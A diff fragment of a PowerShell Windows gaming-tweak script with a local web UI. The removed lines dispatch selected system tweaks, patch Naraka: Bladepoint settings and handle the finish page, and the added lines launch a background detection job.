-            if ($form -isnot [System.Collections.Specialized.NameValueCollection]) { $form = $null }
-            $rawLen = 0; try { if ($script:LastRawForm) { $rawLen = $script:LastRawForm.Length } } catch {}
-            [Console]::WriteLine("Route:/about POST: raw length = $rawLen")
-            if ($script:LastRawForm) { [Console]::WriteLine("Route:/about raw: $($script:LastRawForm.Substring(0, [Math]::Min(512, $script:LastRawForm.Length)))") }
-
-            # Collect selected options
-            $optVals = @()
-            if ($form) {
-                $o = $form.GetValues('opt')
-                if (-not $o -or $o.Count -eq 0) { $o = $form.GetValues('opt[]') }
-                if ($o) { $optVals = @($o) }
-            }
-            # Fallback: parse raw body if needed
-            $parsedJiggle = $null; $parsedBoot = $null; $parsedPath = $null
-            if ((-not $optVals) -and $script:LastRawForm) {
-                $raw = [string]$script:LastRawForm
-                $pairs = $raw -split '&'
-                foreach ($pair in $pairs) {
-                    if ($pair -match '=') {
-                        $kv = $pair -split '=',2
-                        $k = $kv[0]
-                        $v = if ($kv.Count -gt 1) { $kv[1] } else { '' }
-                        # form-url-encoded: '+' is space
-                        $k = ($k -replace '\+','%20'); $v = ($v -replace '\+','%20')
-                        try { $k = [System.Uri]::UnescapeDataString($k) } catch {}
-                        try { $v = [System.Uri]::UnescapeDataString($v) } catch {}
-                        if ($k -eq 'opt' -or $k -eq 'opt[]') { $optVals += $v }
-                        if ($k -eq 'naraka_jiggle') { $parsedJiggle = $v }
-                        if ($k -eq 'naraka_boot') { $parsedBoot = $v }
-                        if ($k -eq 'naraka_path') { $parsedPath = $v }
-                    }
-                }
-            }
-            $global:selectedTweaks = $optVals
-            [Console]::WriteLine("Route:/about POST: selected = " + (($optVals) -join ', '))
-
-            # Map selected ids to functions and execute
-            $optToFn = @{
-                'enable-msi'     = 'Disable-MSIMode'
-                'disable-bgapps' = 'Disable-BackgroundApps'
-                'disable-widgets'= 'Disable-Widgets'
-                'disable-gamebar'= 'Disable-Gamebar'
-                'disable-copilot'= 'Disable-Copilot'
-                'enable-hpet'    = 'Enable-HPET'
-                'disable-hpet'   = 'Disable-HPET'
-                'restore-timers' = 'Restore-DefaultTimers'
-                'pp-high'        = 'Set-PowerPlanHigh'
-                'pp-ultimate'    = 'Set-PowerPlanUltimate'
-                'pp-revert'      = 'Revert-PowerPlan'
-                'vivetool'       = 'Disable-ViVeFeatures'
-            }
-            foreach ($id in $optVals) {
-                $fn = $optToFn[$id]
-                if ($fn) {
-                    try {
-                        [Console]::WriteLine("Route:/about -> $fn")
-                        if (Get-Command $fn -ErrorAction SilentlyContinue) {
-                            & $fn
-                        } elseif (Get-Command ("global:" + $fn) -ErrorAction SilentlyContinue) {
-                            & ("global:" + $fn)
-                        } else {
-                            [Console]::WriteLine("Route:/about -> $fn not found")
-                        }
-                    } catch {
-                        [Console]::WriteLine("Route:/about -> $fn FAILED: $($_.Exception.Message)")
-                    }
-                } else {
-                    [Console]::WriteLine("Route:/about -> unknown option '$id'")
-                }
-            }
-
-            # Handle Naraka In-Game Tweaks
-            $enableJiggle = $false; $enableBoot = $false; $narakaPath = $null
-            if ($form) {
-                $enableJiggle = $form.Get('naraka_jiggle') -eq '1'
-                $enableBoot   = $form.Get('naraka_boot') -eq '1'
-                $narakaPath   = $form.Get('naraka_path')
-            }
-            if (-not $form -and $script:LastRawForm) {
-                if ($parsedJiggle) { $enableJiggle = ($parsedJiggle -eq '1' -or $parsedJiggle -eq 'on' -or $parsedJiggle -eq 'true') }
-                if ($parsedBoot)   { $enableBoot   = ($parsedBoot -eq '1' -or $parsedBoot -eq 'on' -or $parsedBoot -eq 'true') }
-                if ($parsedPath)   { $narakaPath = $parsedPath }
-            }
-            if ($enableJiggle -or $enableBoot) {
-                try {
-                    Patch-NarakaBladepoint -EnableJiggle:$enableJiggle -PatchBoot:$enableBoot -CustomPath:$narakaPath
-                } catch {
-                    Write-Host "Naraka In-Game Tweaks failed: $($_.Exception.Message)"
-                }
-            }
-
-            # Redirect to About page for the final button
-            $ctx.Response.StatusCode = 303
-            $ctx.Response.RedirectLocation = '/about'
-            try { $ctx.Response.Close() } catch {}
-            continue
-        }
-
-        # Final finish route: show completion page, open Ko‑fi, and exit
-        if ($path -eq '/finish' -and ($method -eq 'POST' -or $method -eq 'GET')) {
-            try { Start-Process 'https://ko-fi.com/notratz' } catch {}
-            # Show Windows notification to restart PC
-            try {
-                [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
-                $template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
-                $textNodes = $template.GetElementsByTagName('text')
-                $textNodes.Item(0).AppendChild($template.CreateTextNode('Restart Recommended')) | Out-Null
-                $textNodes.Item(1).AppendChild($template.CreateTextNode('Please restart your PC to apply all tweaks.')) | Out-Null
-                $toast = [Windows.UI.Notifications.ToastNotification]::new($template)
-                $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('NarakaTweaks')
-                $notifier.Show($toast)
-            } catch {}
-            $parentPid = $PID
-            try { $null = Start-Job -ArgumentList $parentPid -ScriptBlock { param($targetPid) Start-Sleep -Seconds 3; try { Stop-Process -Id $targetPid -Force } catch {} } } catch {}
-            $html = & $getStatusHtml 'finish' $null $null $null
-            & $send $ctx 200 'text/html' $html
-            continue
+                return $output
+            } -ArgumentList $req.Url.OriginalString, $PSScriptRoot, $oauthSecret, $webhookUrl, $global:__ratzAuthGate
+            $global:jobId = $detectionJob.Id
+            & $send $ctx 303 'text/plain' 'Redirecting...'
+            $ctx.Response.Headers.Add('Location', '/')
+            break
         }
     }
-}
-
-$progressActivity = "RatzTweaks Initializing..."
-$progressId = 1
-Write-Progress -Id $progressId -Activity $progressActivity -Status "Loading..." -PercentComplete 0
-Start-Sleep -Milliseconds 500
-Write-Progress -Id $progressId -Activity $progressActivity -Status "Checking system..." -PercentComplete 20
-Start-Sleep -Milliseconds 500
-Write-Progress -Id $progressId -Activity $progressActivity -Status "Preparing environment..." -PercentComplete 40
-Start-Sleep -Milliseconds 500
-Write-Progress -Id $progressId -Activity $progressActivity -Status "Loading modules..." -PercentComplete 60
-Start-Sleep -Milliseconds 500
-Write-Progress -Id $progressId -Activity $progressActivity -Status "Almost ready..." -PercentComplete 80
-Start-Sleep -Milliseconds 500
-Write-Progress -Id $progressId -Activity $progressActivity -Status "Done!" -PercentComplete 100
-Start-Sleep -Milliseconds 300
-Write-Progress -Id $progressId -Completed -Activity $progressActivity
-Add-Log "================="
-Add-Log "Script Started!"
-Add-Log "================="
-$StartInWebUI = $true
-# --- Entry Point ---
-# Diagnostic: show entry point state before launching UI
-[Console]::WriteLine("Entry point: StartInWebUI = $([boolean]::Parse(($StartInWebUI -eq $true).ToString()))")
-if (Get-Command -Name Start-WebUI -ErrorAction SilentlyContinue) { [Console]::WriteLine('Entry point: Start-WebUI function is defined') } else { [Console]::WriteLine('Entry point: Start-WebUI function NOT found') }
-[Console]::WriteLine("PSCommandPath = $PSCommandPath")
-if ($StartInWebUI) {
-    [Console]::WriteLine('Entry point: invoking Start-WebUI...')
-    Start-WebUI
-    [Console]::WriteLine('Entry point: returned from Start-WebUI')
-    # Do not exit automatically; keep console open for debugging
 }
